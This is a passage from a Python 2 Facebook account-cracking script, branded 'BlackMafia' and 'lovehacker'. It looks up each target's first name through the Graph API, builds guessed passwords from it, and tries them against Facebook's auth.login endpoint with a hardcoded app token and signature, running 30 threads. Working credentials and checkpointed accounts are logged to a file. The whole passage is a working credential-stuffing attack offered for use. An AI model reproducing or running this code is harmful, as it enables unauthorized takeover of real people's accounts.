              if 'www.facebook.com' in q["error_msg"]:
               print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6
               cek = open("out/checkpoint.txt", "a")
               cek.write(user+"|"+pass6+"\n")
               cek.close()
               cekpoint.append(user+pass6)
              else:
               a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
               b = json.loads(a.text)
               pass7 = b['first_name'] + 'afridi'
               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
               q = json.load(data)
               if 'access_token' in q:
                print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7
                oks.append(user+pass7)
               else:
                if 'www.facebook.com' in q["error_msg"]:
                 print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7
                 cek = open("out/checkpoint.txt", "a")
                 cek.write(user+"|"+pass7+"\n")
                 cek.close()
                 cekpoint.append(user+pass7)
                 
               
  except:
   pass
  
 p = ThreadPool(30)
 p.map(main, id)
 print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mBlackMafia\033[1;95m♡──────────•◈•──────────♡"
 print "  \033[1;93m«---•◈•---Developed By love---•◈•---»" #Dev:love_hacker
 print '\033[1;91mProcess Has Been Completed\033[1;92m....'
 print"\033[1;91mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))
 print """
             
             ...........███ ]▄▄▄▄▄▃
             ..▂▄▅█████▅▄▃▂
             [███████████████]
             ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤
♡──────────────•◈•──────────────♡.
: \033[1;96m .....lovehacker  Bla........... \033[1;93m :
♡──────────────•◈•──────────────♡.' 
                whatsapp Num
               +93784807317"""
 
 raw_input("\n\033[1;92m[\033[1;94mBack\033[1;96m]")
 menu()

if name == 'main':
 login()
